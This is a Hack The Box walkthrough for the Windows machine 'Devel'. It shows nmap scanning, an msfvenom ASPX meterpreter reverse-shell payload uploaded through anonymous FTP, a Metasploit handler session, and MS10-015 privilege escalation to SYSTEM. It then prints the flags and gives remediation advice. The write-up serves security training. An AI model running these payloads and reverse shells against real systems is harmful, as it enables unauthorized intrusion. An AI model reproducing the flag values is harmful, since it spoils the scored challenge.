# Devel HTB Walkthrough

## Machine Information

- **Name**: Devel
- **IP Address**: 10.129.2.151
- **Operating System**: Windows
- **Difficulty**: Easy
- **Points**: 20

## Executive Summary

Devel is a Windows-based Hack The Box machine that demonstrates common misconfigurations in web services. The machine features anonymous FTP access with write permissions and an IIS web server, allowing for easy initial foothold through web shell upload. Privilege escalation is achieved through a known Windows kernel vulnerability.

---

## Reconnaissance

### Initial Scan

We begin with a comprehensive Nmap scan to identify open ports and services:

```bash
export target=10.129.2.151
sudo nmap -p- --min-rate 1000 -sT -vvv $target
```

<img width="431" height="54" alt="image" src="https://github.com/user-attachments/assets/9e3642ea-d886-42c8-af4d-58aaaab08e76" />

<img width="791" height="541" alt="image" src="https://github.com/user-attachments/assets/964ec9a2-1472-46d4-97b5-d225e0177867" />

**Scan Results:**
```
Discovered open ports: 21/tcp (FTP), 80/tcp (HTTP)
```

### Service Enumeration

Perform detailed service version detection and script scanning:

```bash
sudo nmap -sC -sV -p 21,80 -T4 $target
```

<img width="756" height="454" alt="image" src="https://github.com/user-attachments/assets/f5e070cd-6827-49be-882f-bf094c166761" />

**Detailed Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Key Findings

1. **FTP Service (Port 21)**
   - Microsoft FTPd running
   - Anonymous authentication enabled
   - Write access permitted
   - Contains web directory files

2. **HTTP Service (Port 80)**
   - Microsoft IIS 7.5
   - Default IIS7 page visible
   - TRACE method enabled (potential security risk)

<img width="617" height="541" alt="image" src="https://github.com/user-attachments/assets/d8a916e6-2a8f-4f1e-9d84-022741f85a82" />

---

## Initial Foothold

### FTP Analysis

Anonymous FTP login reveals the web root directory:

```bash
ftp $target
Name: anonymous
Password: [any email or blank]
```

<img width="573" height="314" alt="image" src="https://github.com/user-attachments/assets/700e620f-663a-47b4-b34e-f9751c7a83ad" />

**Directory Contents:**
```
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
```

### Web Shell Deployment

Since FTP allows anonymous write access and the directory serves web content, we can upload a malicious ASPX file:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.106 LPORT=4444 > exploit.aspx
```

<img width="809" height="135" alt="image" src="https://github.com/user-attachments/assets/e1068081-1544-48cb-b622-1c18b1dd257c" />

Upload the payload via FTP:
```bash
ftp> put exploit.aspx
```

<img width="942" height="130" alt="image" src="https://github.com/user-attachments/assets/60b6aa97-b74a-4dd4-a14d-471f74e365df" />

### Reverse Shell Setup

Configure Metasploit handler:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.106
set LPORT 4444
run
```

**Initial Access Obtained:**
```
[*] Started reverse TCP handler on 10.10.14.106:4444
[*] Sending stage (175174 bytes) to 10.129.2.151
[*] Meterpreter session 7 opened (10.10.14.106:4444 -> 10.129.2.151:49158)
```

<img width="841" height="389" alt="image" src="https://github.com/user-attachments/assets/4506956e-6c2a-49e4-b4e4-024cfdf943da" />

### Initial Compromise Verification

```bash
meterpreter > getuid
Server username: IIS APPPOOL\Web
```

<img width="561" height="549" alt="image" src="https://github.com/user-attachments/assets/f71973b2-a1ba-4b99-8082-82f89d879fc3" />

---

## Privilege Escalation

### System Enumeration

The initial shell runs with limited privileges under the IIS application pool identity. We need to escalate to SYSTEM.

### Local Exploit Suggester

Use Metasploit's local exploit suggester to identify potential privilege escalation vectors:

```bash
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION 7
run
```

<img width="957" height="559" alt="image" src="https://github.com/user-attachments/assets/ab35e06a-0806-4e51-9028-466df59dd6b2" />

**Identified Vulnerabilities:**
```
[+] The target appears to be vulnerable.
1. exploit/windows/local/bypassuac_comhijack
2. exploit/windows/local/bypassuac_eventvwr
3. exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
4. exploit/windows/local/ms10_015_kitrap0d
```

<img width="954" height="205" alt="image" src="https://github.com/user-attachments/assets/e0a402ee-7eb8-4661-b5d3-ce73cf092597" />

### Kernel Exploit (MS10-015)

The machine is vulnerable to the classic KiTrap0D vulnerability:

```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 7
set LHOST 10.10.14.106
set LPORT 9009
run
```

**Privilege Escalation Successful:**
```
[*] Started reverse TCP handler on 10.10.14.106:9009 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 3804 launched.
[*] Reflectively injecting the DLL into 3804...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.129.2.151
[*] Meterpreter session 2 opened (10.10.14.106:9009 -> 10.129.2.151:49178)
```

<img width="838" height="868" alt="image" src="https://github.com/user-attachments/assets/5e7aa800-be01-46f7-86f5-04c3e966101d" />

### Privilege Verification

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell
whoami
nt authority\system

hostname
devel
```

<img width="515" height="384" alt="image" src="https://github.com/user-attachments/assets/71f77ee0-6aa8-43ef-8bce-aa26a07d3107" />

---

## Post-Exploitation

### Flag Acquisition

**User Flag:**
```bash
type C:\users\babis\desktop\user.txt
ff43ea9f8efca09c9d96e106888ae28b
```

**Root Flag:**
```bash
type C:\users\administrator\desktop\root.txt
d0c3687882cfedfadfd6015e8eba9664
```

### System Information Gathering

Additional system information collected:
- Windows 7 Build 7600
- x86 Architecture
- Greek system language setting
- HTB domain member

---

## Security Assessment & Remediation

### Critical Vulnerabilities Identified

1. **Anonymous FTP with Write Access**
   - **Risk**: Critical
   - **Impact**: Allows unauthorized file upload leading to remote code execution
   - **Remediation**: 
     - Disable anonymous FTP access
     - Implement strong authentication
     - Restrict write permissions
     - Use SFTP instead of FTP

2. **Outdated Windows System**
   - **Risk**: High
   - **Impact**: Vulnerable to known kernel exploits
   - **Remediation**:
     - Apply Windows security updates
     - Specifically patch MS10-015 vulnerability
     - Implement regular patch management

3. **IIS Misconfiguration**
   - **Risk**: Medium
   - **Impact**: TRACE method enabled, potential information disclosure
   - **Remediation**:
     - Disable unnecessary HTTP methods
     - Implement proper web application firewall rules

### Defense Recommendations

1. **Network Security**
   - Implement network segmentation
   - Use firewall rules to restrict unnecessary services
   - Monitor for anomalous FTP activity

2. **Access Control**
   - Principle of least privilege for service accounts
   - Regular access reviews
   - Strong password policies

3. **Monitoring & Detection**
   - File integrity monitoring on web directories
   - SIEM alerts for privilege escalation attempts
   - Regular security audits

---

## Tools Used

- **Nmap**: Network reconnaissance and service enumeration
- **Metasploit**: Exploitation framework and payload generation
- **MSFVenom**: Payload creation
- **FTP Client**: File transfer and verification

---

## Conclusion

The Devel machine demonstrates the critical importance of proper service configuration and patch management. The combination of anonymous FTP write access and unpatched system vulnerabilities created a perfect storm for complete system compromise. This scenario underscores the necessity of:

- Regular security patching
- Proper service configuration
- Principle of least privilege
- Comprehensive security monitoring
  
**Difficulty Level**: Easy  
**Key Learning**: Never allow anonymous write access to web directories

---

*This walkthrough is for educational purposes only. Always ensure you have proper authorization before conducting security testing.*
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
